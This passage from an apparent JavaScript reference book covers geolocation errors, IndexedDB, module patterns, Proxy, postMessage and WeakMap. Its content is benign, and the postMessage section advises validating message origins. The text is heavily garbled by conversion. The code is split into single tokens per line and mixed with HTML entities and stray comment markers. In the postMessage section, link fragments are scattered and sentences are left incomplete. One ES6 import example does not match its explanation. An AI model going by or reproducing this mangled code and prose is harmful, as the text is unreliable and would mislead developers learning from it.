&quot;ERROR (&quot;
&plus;
err.
code
&plus;
&quot;): &quot;
&plus;
err.
message
)
;
}
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch71-3">Section 71.3: More descriptive error codes</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
In the event that geolocation fails, your callback function will
receive a PositionError object. The object will include an attribute
named code that will have a value of 1, 2, or 3. Each of these numbers
signifies a different kind of error;
getErrorCode()     function below takes the      PositionError.code
the as its only argument and returns a string with the name of the
error that occurred.
**var**
getErrorCode
=
**function**
(
err
)
{
**switch**
(

err.

code

)

{

**case**

err.

PERMISSION_DENIED

:

**return**

&quot;PERMISSION_DENIED&quot;

;

**case**

err.

POSITION_UNAVAILABLE

:

**return**

&quot;POSITION_UNAVAILABLE&quot;

;

**case**

err.

TIMEOUT

:

**return**

&quot;TIMEOUT&quot;

;

**default**

:

**return**

&quot;UNKNOWN_ERROR&quot;

;

}

}

;

It can be used in

geolocationFailur

e

(

)

like so:

**var**

geolocationFailure

=

**function**

(

err

)

{

console.

log

(

&quot;ERROR (&quot;

&plus;

getErrorCode

(

err

)

&plus;

&quot;): &quot;

&plus;

err.

message

)

;

}

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch72">Chapter 72: IndexedDB</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch72-1">Section 72.1: Opening a database</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Opening a database is an asynchronous operation. We need to send a
request to open our database and then listen for events so we know
when it&apos;s ready.
We&apos;ll open a DemoDB database. If it doesn&apos;t exist yet, it will get
created when we send the request.
The 2 below says that we&apos;re asking for version 2 of our database.
Only one version exists at any time, but we can use the version number
to upgrade old data, as you&apos;ll see.
**var**
db
=
**null**
,
// <i>We&apos;ll use this once we have our database*
request
=
window.
indexedDB
.
open
(
&quot;DemoDB&quot;
,
2
)
;
// <i>Listen for success. This will be called after onupgradeneeded runs,
if it does at all*
request.
onsuccess
=
**function**
(
)
{
db
=
request.
result
;
// <i>We have a database!*
doThingsWithDB
(
db
)
;
}
;
// <i>If our database didn&apos;t exist before, or it was an older version
than what we requested,*
// <i>the &grave;onupgradeneeded&grave; event will be fired.*
// <i>*
// <i>We can use this to setup a new database and upgrade an old one with
new data stores*
request.
onupgradeneeded
=
**function**
(
event
)
{
db
=
request.
result
;
// <i>If the oldVersion is less than 1, then the database didn&apos;t exist.
Let&apos;s set it up*
**if**
(
event.
oldVersion
&lt;
1
)
{
// <i>We&apos;ll create a new &quot;things&quot; store with &grave;autoIncrement&grave;ing keys*
**var**
store
=
db.
createObjectStore
(
&quot;things&quot;
,
{
autoIncrement
:
**true**
}
)
;
}
// <i>In version 2 of our database, we added a new index by the name of
each thing*
**if**
(
event.
oldVersion
&lt;
2
)
{
// <i>Let&apos;s load the things store and create an index*
**var**
store
=
request.
transaction
.
objectStore
(
&quot;things&quot;
)
;
store.
createIndex
(
&quot;by_name&quot;
,
&quot;name&quot;
)
;
}
}
;
// <i>Handle any errors*
request.
onerror
=
**function**
(
)
{
console.
error
(
&quot;Something went wrong when we tried to request the database!&quot;
)
;
}
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch72-2">Section 72.2: Adding objects</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Anything that needs to happen with data in an IndexedDB database
happens in a transaction. There are a few things to note about
transactions that are mentioned in the Remarks section at the bottom
of this page.
We&apos;ll use the database we set up in **Opening a database.**
// <i>Create a new readwrite (since we want to change things)
transaction for the things store* **var** transaction =
db.transaction(&lbrack;&quot;things&quot;&rbrack;, &quot;readwrite&quot;);
// <i>Transactions use events, just like database open requests. Let&apos;s
listen for success*
transaction.
oncomplete
=
**function**
(
)
{
console.
log
(
&quot;All done!&quot;
)
;
}
;
// <i>And make sure we handle errors*
transaction.
onerror

=

**function**

(

)

{

console.

log

(

&quot;Something went wrong with our transaction: &quot;

,

transaction.

error

)

;

}

;

// <i>Now that our event handlers are set up, let&apos;s get our things store
and add some objects!*

**var**

store

=

transaction.

objectStore

(

&quot;things&quot;

)

;

// <i>Transactions can do a few things at a time. Let&apos;s start with a
simple insertion*

**var**

request

=

store.

add

(

{

// <i>&quot;things&quot; uses auto-incrementing keys, so we don&apos;t need one, but
we can set it anyway*

key

:

&quot;coffee_cup&quot;

,

name

:

&quot;Coffee Cup&quot;

,

contents

:

&lbrack;

&quot;coffee&quot;

,

&quot;cream&quot;

&rbrack;

}

)

;

// <i>Let&apos;s listen so we can see if everything went well*

request.

onsuccess

=

**function**

(

event

)

{

// <i>Done! Here, &grave;request.result&grave; will be the object&apos;s key,
&quot;coffee_cup&quot;</i>

}

;

// <i>We can also add a bunch of things from an array. We&apos;ll use
auto-generated keys*

**var**
thingsToAdd
=
&lbrack;
{
name
:
&quot;Example object&quot;
}
,
{
value
:
&quot;I don&apos;t have a name&quot;
}
&rbrack;
;
// <i>Let&apos;s use more compact code this time and ignore the results of our
insertions*
thingsToAdd.
forEach
(
e
=&gt;
store.
add
(
e
)
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch72-3">Section 72.3: Retrieving data</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Anything that needs to happen with data in an IndexedDB database
happens in a transaction. There are a few things to note about
transactions that are mentioned in the Remarks section at the bottom
of this page.
We&apos;ll use the database we set up in Opening a database.
// <i>Create a new transaction, we&apos;ll use the default &quot;readonly&quot; mode
and the things store*
**var**
transaction
=
db.
transaction
(
&lbrack;
&quot;things&quot;
&rbrack;
)
;
// <i>Transactions use events, just like database open requests. Let&apos;s
listen for success*
transaction.
oncomplete
=
**function**
(
)
{
console.
log
(
&quot;All done!&quot;
)
;
}
;
// <i>And make sure we handle errors*
transaction.
onerror
=
**function**
(
)
{
console.
log
(
&quot;Something went wrong with our transaction: &quot;
,
transaction.
error
)
;
}
;
// <i>Now that everything is set up, let&apos;s get our things store and load
some objects!*
**var**
store
=
transaction.
objectStore
(
&quot;things&quot;
)
;
// <i>We&apos;ll load the coffee_cup object we added in Adding objects*
**var**
request
=
store.
**get**
(
&quot;coffee_cup&quot;
)
;
// <i>Let&apos;s listen so we can see if everything went well*
request.
onsuccess
=
**function**
(
event
)
{
// <i>All done, let&apos;s log our object to the console*
console.
log
(
request.
result
)
;
}
;
// <i>That was pretty long for a basic retrieval. If we just want to get just</i>
// <i>the one object and don&apos;t care about errors, we can shorten things a lot</i>
db.
transaction
(
&quot;things&quot;
)
.
objectStore
(
&quot;things&quot;
)
.
**get**
(
&quot;coffee_cup&quot;
)
.
onsuccess
=
e
=&gt;
console.
log
(
e&period;
target
.
result
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch72-4">Section 72.4: Testing for IndexedDB availability</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
window.indexedDB
You can test for IndexedDB support in the current environment by
checking for the presence of the property:
**if**
(
window.
indexedDB
)
{
// <i>IndexedDB is available*
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch73">Chapter 73: Modularization Techniques</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch73-1">Section 73.1: ES6 Modules</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<h5>Version ≥ 6</h5>
In ECMAScript 6, when using the module syntax (import/export), each
file becomes its own module with a private namespace. Top-level
functions and variables do not pollute the global namespace. To expose
functions, classes, and variables for other modules to import, you can
use the export keyword.
**Note:** Although this is the official method for creating JavaScript
modules, it is not supported by any major browsers right now. However,
ES6 Modules are supported by many transpilers.
export
**function**
greet
(
name
)
{
console.
log
(
&quot;Hello %s!&quot;
,
name
)
;
}
**var**
myMethod
=
**function**
(
param
)
{
**return**
&quot;Here&apos;s what you said: &quot;
&plus;
param
;
}
;
export
{
myMethod
}
export
class
MyClass
{
test
(
)
{
}
}
**Using Modules**
Importing modules is as simple as specifying their path:
import
greet from
&quot;mymodule.js&quot;
;
greet
(
&quot;Bob&quot;
)
;
mymodule.js
This imports only the myMethod method from our file.
It&apos;s also possible to import all methods from a module:
import
&ast;
as myModule from
&quot;mymodule.js&quot;
;
myModule.
greet
(
&quot;Alice&quot;
)
;
You can also import methods under a new name:
import
{
greet as A
,
myMethod as B
}
from
&quot;mymodule.js&quot;
;
More information on ES6 Modules can be found in the Modules topic.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch73-2">Section 73.2: Universal Module Definition (UMD)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The UMD (Universal Module Definition) pattern is used when our module
needs to be imported by a number of different module loaders (e.g.
AMD, CommonJS).
The pattern itself consists of two parts:
1.  An IIFE (Immediately-Invoked Function Expression) that checks for
    the module loader that is being implemented by the user. This will
    take two arguments; root (a **this** reference to the global scope)
    and factory (the function where we declare our module).
2.  An anonymous function that creates our module. This is passed as the
    second argument to the IIFE portion of the pattern. This function is
    passed any number of arguments to specify the dependencies of the
    module.
In the below example we check for AMD, then CommonJS. If neither of
those loaders are in use we fall back to making the module and its
dependencies available globally.
(
**function**
(
root
,
factory
)
{
**if**
(
**typeof**
define
===
&apos;function&apos;
&&
define.
amd
)
{
// <i>AMD. Register as an anonymous module.*
define
(
&lbrack;
&apos;exports&apos;
,
&apos;b&apos;
&rbrack;
,
factory
)
;
}
**else**
**if**
(
**typeof**
exports
===
&apos;object&apos;
&&
**typeof**
exports.
nodeName
!==
&apos;string&apos;
)
{
// <i>CommonJS*
factory
(
exports
,
require
(
&apos;b&apos;
)
)
;
}
**else**
{
// <i>Browser globals*
factory
(
(
root.
commonJsStrict
=
{
}
)
,
root.
b
)
;
}
}
(
**this**
,
**function**
(
exports
,
b
)
{
// <i>use b in some fashion.*
// <i>attach properties to the exports object to define*
// <i>the exported module properties.*
exports.
action
=
**function**
(
)
{
}
;
}
)
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch73-3">Section 73.3: Immediately invoked function expressions (IIFE)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Immediately invoked function expressions can be used to create a
private scope while producing a public API.
**var**
Module
=
(
**function**
(
)
{
**var**
privateData
=
1
;
**return**
{
getPrivateData
:
**function**
(
)
{
**return**
privateData
;
}
}
;
}
)
(
)
;
Module.
getPrivateData
(
)
;
// <i>1*
Module.
privateData
;
// <i>undefined*
See the Module Pattern for more details.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch73-4">Section 73.4: Asynchronous Module Definition (AMD)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
AMD is a module definition system that attempts to address some of the
common issues with other systems like CommonJS and anonymous closures.
AMD addresses these issues by:
Registering the factory function by calling define(), instead of
immediately executing it
Passing dependencies as an array of module names, which are then
loaded, instead of using globals
Only executing the factory function once all the dependencies have
been loaded and executed
Passing the dependent modules as arguments to the factory function
The key thing here is that a module can have a dependency and not hold
everything up while waiting for it to load, without the developer
having to write complicated code.
Here&apos;s an example of AMD:
// <i>Define a module &quot;myModule&quot; with two dependencies, jQuery and
Lodash*
define
(
&quot;myModule&quot;
,
&lbrack;
&quot;jquery&quot;
,
&quot;lodash&quot;
&rbrack;
,
**function**
(
&dollar;
,
&lowbar;
)
{
// <i>This publicly accessible object is our module*
// <i>Here we use an object, but it can be of any type*
**var**
myModule
=
{
}
;
**var**
privateVar
=
&quot;Nothing outside of this module can see me&quot;
;
**var**
privateFn
=
**function**
(
param
)
{
**return**
&quot;Here&apos;s what you said: &quot;
&plus;
param
;
}
;
myModule.
version
=
1
;
myModule.
moduleMethod
=
**function**
(
)
{
// <i>We can still access global variables from here, but it&apos;s better*
// <i>if we use the passed ones*
**return**
privateFn
(
windowTitle
)
;
}
;
**return**
myModule
;
}
)
;
Modules can also skip the name and be anonymous. When that&apos;s done,
they&apos;re usually loaded by file name.
define
(
&lbrack;
&quot;jquery&quot;
,
&quot;lodash&quot;
&rbrack;
,
**function**
(
&dollar;
,
&lowbar;
)
{
<i>/&ast; factory &ast;/*
}
)
;
They can also skip dependencies:
define
(
**function**
(
)
{
<i>/&ast; factory &ast;/*
}
)
;
Some AMD loaders support defining modules as plain objects:
define
(
&quot;myModule&quot;
,
{
version
:
1
,
value
:
&quot;sample string&quot;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch73-5">Section 73.5: CommonJS - Node.js</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
CommonJS is a popular modularization pattern that&apos;s used in Node.js.
require
The CommonJS system is centered around a () function that loads other
modules and an exports property that lets modules export publicly
accessible methods.
Here&apos;s an example of CommonJS, we&apos;ll load Lodash and Node.js&apos; fs
module:
// <i>Load fs and lodash, we can use them anywhere inside the module*
**var**
fs
=
require
(
&quot;fs&quot;
)
,
&lowbar;
=
require
(
&quot;lodash&quot;
)
;
**var**
myPrivateFn
=
**function**
(
param
)
{
**return**
&quot;Here&apos;s what you said: &quot;
&plus;
param
;
}
;
// <i>Here we export a public &grave;myMethod&grave; that other modules can use*
exports.
myMethod
=
**function**
(
param
)
{
**return**
myPrivateFn
(
param
)
;
}
;
module.exports
You can also export a function as the entire module using :
module.
exports
=
**function**
(
)
{
**return**
&quot;Hello!&quot;
;
}
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch74">Chapter 74: Proxy</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Parameter Details**
target The target object, actions on this object (getting, setting,
etc&hellip;) will be routed through the handler handler An object that can
define &quot;traps&quot; for intercepting actions on the target object
(getting, setting, etc&hellip;)
A Proxy in JavaScript can be used to modify fundamental operations on
objects. Proxies were introduced in ES6. A
Proxy on an object is itself an object, that has *traps*. Traps may be
triggered when operations are performed on the Proxy. This includes
property lookup, function calling, modifying properties, adding
properties, et cetera. When no applicable trap is defined, the
operation is performed on the proxied object as if there was no Proxy.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch74-1">Section 74.1: Proxying property lookup</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To influence property lookup, the **get** handler must be used.
In this example, we modify property lookup so that not only the value,
but also the type of that value is returned. We use
[Reflect](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect)
to ease this.
**let**
handler
=
{
**get**
(
target
,
property
)
{
**if**
(
!
Reflect.
has
(
target
,
property
)
)
{
**return**
{
value
:
**undefined**
,
type
:
&apos;undefined&apos;
}
;
}
**let**
value
=
Reflect.
**get**
(
target
,
property
)
;
**return**
{
value
:
value
,
type
:
**typeof**
value
}
;
}
}
;
**let**
proxied
=
**new**
Proxy
(
{
foo
:
&apos;bar&apos;
}
,
handler
)
;
console.
log
(
proxied.
foo
)
;
// <i>logs &grave;Object {value: &quot;bar&quot;, type: &quot;string&quot;}&grave;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch74-2">Section 74.2: Very simple proxy (using the set trap)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
This proxy simply appends the string &quot; went through proxy&quot; to every
string property set on the target object.
**let**
object
=
{
}
;
**let**
handler
=
{
**set**
(
target
,
prop
,
value
)
{
// <i>Note that ES6 object syntax is used*
**if**
(
&apos;string&apos;
===
**typeof**
value
)
{
target
&lbrack;
prop
&rbrack;
=
value
&plus;
&quot; went through proxy&quot;
;
}
}
}
;
**let**
proxied
=
**new**
Proxy
(
object
,
handler
)
;
proxied.
example
=
&quot;ExampleValue&quot;
;
console.
log
(
object
)
;
// <i>logs: { example: &quot;ExampleValue went through proxy&quot; }*
// <i>you could also access the object via proxied.target*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch75">Chapter 75: .postMessage() and MessageEvent</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Parameters** **message** **targetOrigin**
transfer optional
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch75-1">Section 75.1: Getting Started</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**What is
[.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage),
when and why do we use it**
[**postMessage**](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
**[.()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
method is a way to safely allow communication between cross-origin
scripts.**
window.open ()). With 
[postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
[.](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   
Normally, two different pages, can only directly communicate with each
other using JavaScript when they are under the same origin, even if
one of them is embedded into another (e.g. iframes) or one is opened
from inside the other (e.g.
[()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage),
you can work around this restriction while still staying safe.
[**postMessage**](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
**You can only use
[.()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
when you have access to both pages&apos; JavaScript code.** Since the
receiver needs to validate the sender and process the message
accordingly, you can only use this method to communicate between two
scripts you have access to.
http             :    // <i>sender.com*
http            :   // <i>receiver.com*
We will build an example to send messages to a child window and have
the messages be displayed on the child window. The parent/sender page
will be assumed to be and child/receiver page will be assumed to be
for the example.
**Sending messages**
[window.open](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)
In order to send messages to another window, you need to have a
reference to its
[window](https://developer.mozilla.org/en-US/docs/Web/API/Window)
object.
[()](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)
returns the reference object of the newly opened window. For other
methods to obtain a reference to a window object, see the explanation
under otherWindow parameter
[here](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#Syntax).
**var**
childWindow
=
window.
open
(
&quot;http://receiver.com&quot;
,
&quot;&lowbar;blank&quot;
)
;
Add a textarea and a send button that will be used to send messages to
child window.
**&lt;**
**textarea**
id
=
&quot;text&quot;
**&gt;**
**&lt;**
**/textarea**
**&gt;**
**&lt;**
**button**
id
=
&quot;btn&quot;
**&gt;**
Send Message
**&lt;**
**/button**
**&gt;**
[postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [(](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [message](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [,](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [targetOrigin](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
Send the text of textarea using
[.)](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
when the button is clicked.
**var**
btn
=
document.
getElementById
(
&quot;btn&quot;
)
,
text
=
document.
getElementById
(
&quot;text&quot;
)
;
btn.
addEventListener
(
&quot;click&quot;
,
**function**
(
)
{
sendMessage
(
text.
value
)
;
text.
value
=
&quot;&quot;
;
}
)
;
**function**
sendMessage
(
message
)
{
**if**
(
!
message
&vert;&vert;
!
message.
length
)
**return**
;
childWindow.
postMessage
(
JSON.
stringify
(
{
message
:
message
,
time
:
**new**
Date
(
)
}
)
,
&apos;http://receiver.com&apos;
)
;
}
[JSON.stringify](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify)   [()](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify)   [JSON.parse](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)
[Transfarable                                                            can be given as the third optional parameter of the                        [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [(](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [message](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
Object](https://developer.mozilla.org/en-US/docs/Web/API/Transferable)   [.](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)                                                                                                                                                                   
In order send and receive JSON objects instead of a simple string,
[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)
methods can be used. A
[,](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
[targetOrigin](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [,](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [transfer](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
[)](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
method, but browser support is still lacking even in modern browsers.
http            :   // <i>receiver.com</i>
For this example, since our receiver is assumed to be page, we enter
its url as the targetOrigin. The value of this parameter should match
the origin of the childWindow object for the message to be send. It is
possible to use &ast; as a wildcard but is **highly recommended** to
avoid using the wildcard and always set this parameter to receiver&apos;s
specific origin **for security reasons**.
**Receiving, Validating and Processing Messages**
  http            :   // <i>receiver.com*
The code under this part should be put in the receiver page, which is
for our example.
In order to receive messages, the [message
event](https://developer.mozilla.org/en-US/docs/Web/Events/message_webmessaging)
of the window should be listened.
window.
addEventListener
(
&quot;message&quot;
,
receiveMessage
)
;
When a message is received there are a couple of **steps that should
be followed to assure security as much as possible**.
Validate the sender
Validate the message
Process the message
The sender should always be validated to make sure the message is
received from a trusted sender. After that, the message itself should
be validated to make sure nothing malicious is received. After these
two validations, the message can be processed.
**function**
receiveMessage
(
ev
)
{
// <i>Check event.origin to see if it is a trusted sender.*
// <i>If you have a reference to the sender, validate event.source*
// <i>We only want to receive messages from http://sender.com, our trusted
sender page.*
**if**
(
ev.
origin
!==
&quot;http://sender.com&quot;
&vert;&vert;
ev.
source
!==
window.
opener
)
**return**
;
// <i>Validate the message*
// <i>We want to make sure it&apos;s a valid json object and it does not
contain anything malicious*
**var**
data
;
**try**
{
data
=
JSON.
parse
(
ev.
data
)
;
// <i>data.message = cleanseText(data.message)*
}
**catch**
(
ex
)
{
**return**
;
}
// <i>Do whatever you want with the received message*
// <i>We want to append the message into our #console div*
**var**
p
=
document.
createElement
(
&quot;p&quot;
)
;
p&period;
innerText
=
(
**new**
Date
(
data.
time
)
)
.
toLocaleTimeString
(
)
&plus;
&quot; &vert; &quot;
&plus;
data.
message
;
document.
getElementById
(
&quot;console&quot;
)
.
appendChild
(
p
)
;
}
[Click here for a JS Fiddle showcasing its
usage.](https://jsfiddle.net/ozzan/6gjstodk/)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch76">Chapter 76: WeakMap</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch76-1">Section 76.1: Creating a WeakMap object</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
WeakMap object allows you to store key/value pairs. The difference
from Map is that keys must be objects and are weakly referenced. This
means that if there aren&apos;t any other strong references to the key,
the element in WeakMap can be removed by garbage collector.
WeakMap constructor has an optional parameter, which can be any
iterable object (for example Array) containing key/value pairs as
two-element arrays.
**const**
o1
=
{
a
:
1
,
b
:
2
}
,
o2
=
{
}
;
**const**
weakmap
=
**new**
WeakMap
(
&lbrack;
&lbrack;
o1
,
**true**
&rbrack;
,
&lbrack;
o2
,
o1
&rbrack;
&rbrack;
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch76-2">Section 76.2: Getting a value associated to the key</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
.**get**()
To get a value associated to the key, use the method. If there&apos;s no
value associated to the key, it returns
**undefined**
.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakmap
=
**new**
WeakMap
(
&lbrack;
&lbrack;
obj1
,
7
&rbrack;
&rbrack;
)
;
console.
log
(
weakmap.
**get**
(
obj1
)
)
;
// <i>7*
console.
log
(
weakmap.
**get**
(
obj2
)
)
;
// <i>undefined*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch76-3">Section 76.3: Assigning a value to the key</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
.**set**()   method. It returns the WeakMap object, so you can chain   .**set**()
To assign a value to the key, use the calls.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakmap
=
**new**
WeakMap
(
)
;
weakmap.
**set**
(
obj1
,
1
)
.
**set**
(
obj2
,
2
)
;
console.
log
(
weakmap.
**get**
(
obj1
)
)
;
// <i>1*
console.
log
(
weakmap.
**get**
(
obj2
)
